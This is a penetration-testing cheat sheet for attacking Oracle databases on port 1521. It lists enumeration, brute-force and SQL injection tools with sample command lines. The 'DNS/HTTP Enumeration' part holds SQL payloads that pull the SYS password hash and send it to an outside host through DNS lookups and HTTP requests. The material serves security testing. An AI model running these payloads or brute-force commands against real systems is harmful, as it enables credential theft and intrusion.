<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Oracle (Port 1521)
### References
* SQL Cheatsheets
	* [http://ha.ckers.org/sqlinjection](http://ha.ckers.org/sqlinjection)
	* [http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)
	* [http://www.0x000000.com/?i=14](http://www.0x000000.com/?i=14)
	* [http://pentestmonkey.net/](http://pentestmonkey.net/)

### Attack Guide
* Oracle Enumeration
	* oracsec
	* Repscan
	* Sidguess
	* Scuba
	* DNS/HTTP Enumeration

		SQL> SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL
		SQL> select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;
	* WinSID
	* Oracle default password list
	* TNSVer
	
			tnsver host [port]
	* TCP Scan
	* Oracle TNSLSNR
		Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]
	* TNSCmd

			perl tnscmd.pl -h ip_address
			perl tnscmd.pl version -h ip_address
			perl tnscmd.pl status -h ip_address
			perl tnscmd.pl -h ip_address --cmdsize (40 - 200)
	* LSNrCheck
	* Oracle Security Check (needs credentials)
	* OAT

			sh opwg.sh -s ip_address
			opwg.bat -s ip_address
			sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID
	* OScanner

			sh oscanner.sh -s ip_address
			oscanner.exe -s ip_address
			sh reportviewer.sh oscanner_saved_file.xml
			reportviewer.exe oscanner_saved_file.xml
	* NGS Squirrel for Oracle
	* Service Register

			Service-register.exe ip_address
	* PLSQL Scanner 2008
* Oracle Brute Force
	* OAK

			ora-getsid hostname port sid_dictionary_list
			ora-auth-alter-session host port sid username password sql
			ora-brutesid host port start
			ora-pwdbrute host port sid username password-file
			ora-userenum host port sid userlistfile
			ora-ver -e (-f -l -a) host port
	* breakable (Targets Application Server Port)
   
			breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose
	* SQLInjector (Targets Application Server Port)

			sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL
			sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle
	* Check Password
	* orabf

			orabf [hash]:[username] [options]
	* thc-orakel
		* Cracker
		* Client
		* Crypto
	* DBVisualisor
		* Sql scripts from pentest.co.uk
		* Manual sql input of previously reported vulnerabilties
* Oracle Reference Material
	* Understanding SQL Injection
	* SQL Injection walkthrough
	* SQL Injection by example
	* Advanced SQL Injection in Oracle databases
	* Blind SQL Injection